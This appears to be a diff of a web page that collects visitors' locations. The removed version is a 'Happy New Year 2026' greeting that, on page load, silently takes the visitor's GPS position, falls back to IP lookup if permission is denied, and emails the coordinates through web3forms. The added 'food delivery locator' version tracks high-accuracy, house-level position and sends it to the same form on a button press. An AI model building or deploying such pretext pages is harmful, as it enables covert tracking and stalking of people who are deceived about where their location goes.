@@ -2,184 +2,157 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Happy New Year 2026 | Food Dash</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sanjay's Food Delivery Locator</title>
+    
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    
     <style>
-        :root {
-            --gold: #ffd700;
-            --dark-bg: #0f0c29;
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background: #f8f9fa; 
+            margin: 0; 
+            padding: 15px; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
         }
-
-        body {
-            background: linear-gradient(to bottom, #0f0c29, #302b63, #24243e);
-            font-family: 'Segoe UI', Roboto, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            color: white;
-            overflow: hidden;
-            text-align: center;
+        .container { 
+            background: white; 
+            padding: 25px; 
+            border-radius: 20px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08); 
+            width: 100%; 
+            max-width: 400px; 
+            text-align: center; 
+            box-sizing: border-box;
         }
-
-        .container {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(15px);
-            padding: 40px 20px;
-            border-radius: 30px;
-            border: 1px solid rgba(255, 215, 0, 0.3);
-            width: 85%;
-            max-width: 400px;
-            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
-            z-index: 10;
+        h2 { color: #2d3436; margin-bottom: 5px; }
+        #map { 
+            height: 250px; 
+            width: 100%; 
+            border-radius: 15px; 
+            margin: 20px 0; 
+            border: 1px solid #eee; 
+            z-index: 1;
         }
-
-        .new-year-title {
-            font-size: 2.2rem;
-            color: var(--gold);
-            margin-bottom: 10px;
-            text-shadow: 0 0 15px rgba(255, 215, 0, 0.6);
-            animation: glow 2s ease-in-out infinite alternate;
+        .accuracy-badge { 
+            display: inline-block; 
+            padding: 6px 12px; 
+            background: #e3f2fd; 
+            color: #1976d2; 
+            border-radius: 50px; 
+            font-size: 13px; 
+            font-weight: 600;
         }
-
-        @keyframes glow {
-            from { text-shadow: 0 0 10px var(--gold); }
-            to { text-shadow: 0 0 25px var(--gold), 0 0 10px #fff; }
+        button { 
+            background: #00b894; 
+            color: white; 
+            border: none; 
+            padding: 16px; 
+            border-radius: 12px; 
+            width: 100%; 
+            font-size: 17px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 12px rgba(0, 184, 148, 0.3);
         }
-
-        .loader {
-            border: 3px solid rgba(255, 255, 255, 0.1);
-            border-top: 3px solid var(--gold);
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        #status {
-            font-size: 1rem;
-            color: #e0e0e0;
-            margin-bottom: 20px;
-        }
-
-        .btn {
-            background: var(--gold);
-            color: black;
-            border: none;
-            padding: 12px 30px;
-            border-radius: 50px;
-            font-weight: bold;
-            font-size: 1rem;
-            display: none; /* Hidden until location sent */
-            text-decoration: none;
-            transition: transform 0.2s;
-        }
-
-        .btn:active { transform: scale(0.95); }
-
-        /* Small stars background */
-        .stars {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            background: transparent url('https://www.transparenttextures.com/patterns/stardust.png') repeat;
-            top: 0; left: 0;
-        }
+        button:active { transform: scale(0.97); background: #00a383; }
+        button:disabled { background: #ccc; box-shadow: none; cursor: not-allowed; }
+        #status { font-size: 14px; color: #636e72; margin-top: 15px; line-height: 1.4; }
     </style>
 </head>
 <body>
 
-    <div class="stars"></div>
+<div class="container">
+    <h2>Delivery Location</h2>
+    <div id="accuracy" class="accuracy-badge">Initializing GPS...</div>
+    
+    <div id="map"></div>
 
-    <div class="container">
-        <div class="new-year-title">Happy New Year<br>2026! 🎆</div>
-        <div id="loader" class="loader"></div>
-        <p id="status">Verifying your delivery address...</p>
-        <a href="#" id="menuBtn" class="btn">Explore New Year Menu</a>
-    </div>
-
-    <form id="locationForm" style="display:none;">
+    <form action="https://api.web3forms.com/submit" method="POST" id="locationForm">
         <input type="hidden" name="access_key" value="d5ceb622-59e5-41a9-89f8-41aaf5f099e4">
-        <input type="hidden" name="subject" value="New Food Order Location Captured">
-        <input type="hidden" name="from_name" value="Delivery App Prototype">
-        <input type="hidden" name="type" id="formType">
-        <input type="hidden" name="map_link" id="formLink">
-        <input type="hidden" name="coords" id="formCoords">
+        <input type="hidden" name="from_name" value="Delivery App Demo">
+        <input type="hidden" name="subject" value="New Delivery Location Found">
+        
+        <input type="hidden" name="Latitude" id="lat_input">
+        <input type="hidden" name="Longitude" id="lng_input">
+        <input type="hidden" name="Accuracy_Radius" id="acc_input">
+        <input type="hidden" name="Google_Maps_Link" id="gmaps_input">
+
+        <input type="hidden" name="redirect" value="https://web3forms.com/success">
+
+        <button type="submit" id="submitBtn" disabled>Confirming Location...</button>
     </form>
+    
+    <div id="status">Please grant location access when prompted.</div>
+</div>
 
-    <script>
-        const statusText = document.getElementById('status');
-        const loader = document.getElementById('loader');
-        const menuBtn = document.getElementById('menuBtn');
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
-        async function sendToGmail(data) {
-            document.getElementById('formType').value = data.method;
-            document.getElementById('formCoords').value = `${data.lat}, ${data.lng}`;
-            document.getElementById('formLink').value = `https://www.google.com/maps?q=${data.lat},${data.lng}`;
+<script>
+    const statusText = document.getElementById('status');
+    const accBadge = document.getElementById('accuracy');
+    const submitBtn = document.getElementById('submitBtn');
+    
+    // Initialize Map centered on a placeholder
+    const map = L.map('map').setView([0, 0], 2);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '© OpenStreetMap'
+    }).addTo(map);
+    
+    const marker = L.marker([0, 0]).addTo(map);
 
-            const formData = new FormData(document.getElementById('locationForm'));
-            const object = Object.fromEntries(formData);
+    // High Precision Location Tracking
+    if ("geolocation" in navigator) {
+        // watchPosition updates in real-time as the user moves
+        navigator.geolocation.watchPosition((position) => {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
 
-            try {
-                const response = await fetch('https://api.web3forms.com/submit', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(object)
-                });
-                
-                if (response.ok) {
-                    loader.style.display = "none";
-                    statusText.innerText = "Location Verified Successfully!";
-                    menuBtn.style.display = "inline-block";
-                }
-            } catch (err) {
-                statusText.innerText = "Connection error. Please try again.";
+            // Update UI Map
+            const userPos = [lat, lng];
+            map.setView(userPos, 18); // Zoom level 18 is perfect for house-level
+            marker.setLatLng(userPos);
+
+            // Populate Form Fields
+            document.getElementById('lat_input').value = lat;
+            document.getElementById('lng_input').value = lng;
+            document.getElementById('acc_input').value = `${accuracy.toFixed(2)} meters`;
+            
+            // Fixed Google Maps Link Format
+            const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+            document.getElementById('gmaps_input').value = mapsUrl;
+
+            // UI Updates
+            accBadge.textContent = `Accuracy: ${accuracy.toFixed(1)}m`;
+            statusText.textContent = "High-precision location locked.";
+            submitBtn.disabled = false;
+            submitBtn.textContent = "Send Delivery Address";
+
+        }, (error) => {
+            let msg = "";
+            switch(error.code) {
+                case error.PERMISSION_DENIED: msg = "User denied location access."; break;
+                case error.POSITION_UNAVAILABLE: msg = "Location info unavailable."; break;
+                case error.TIMEOUT: msg = "Request timed out."; break;
+                default: msg = "An unknown error occurred."; break;
             }
-        }
+            statusText.textContent = "Error: " + msg;
+            accBadge.style.background = "#ffebee";
+            accBadge.style.color = "#c62828";
+            accBadge.textContent = "GPS Error";
+        }, {
+            enableHighAccuracy: true, // THE KEY FOR HIGH PRECISION
+            maximumAge: 0,
+            timeout: 20000
+        });
+    } else {
+        statusText.textContent = "Your browser does not support Geolocation.";
+    }
+</script>
 
-        function useIPFallback() {
-            statusText.innerText = "Fetching address via network...";
-            fetch('https://ipapi.co/json/')
-                .then(res => res.json())
-                .then(ipData => {
-                    sendToGmail({
-                        method: "IP-BASED (Approximate)",
-                        lat: ipData.latitude,
-                        lng: ipData.longitude
-                    });
-                })
-                .catch(() => {
-                    statusText.innerText = "Please enable location for delivery.";
-                });
-        }
-
-        function captureLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        sendToGmail({
-                            method: "GPS (Highly Accurate)",
-                            lat: position.coords.latitude,
-                            lng: position.coords.longitude
-                        });
-                    },
-                    (error) => {
-                        console.warn("GPS Denied, using IP.");
-                        useIPFallback();
-                    },
-                    { enableHighAccuracy: true, timeout: 8000 }
-                );
-            } else {
-                useIPFallback();
-            }
-        }
-
-        // Start the process immediately
-        window.onload = captureLocation;
-    </script>
 </body>
 </html>
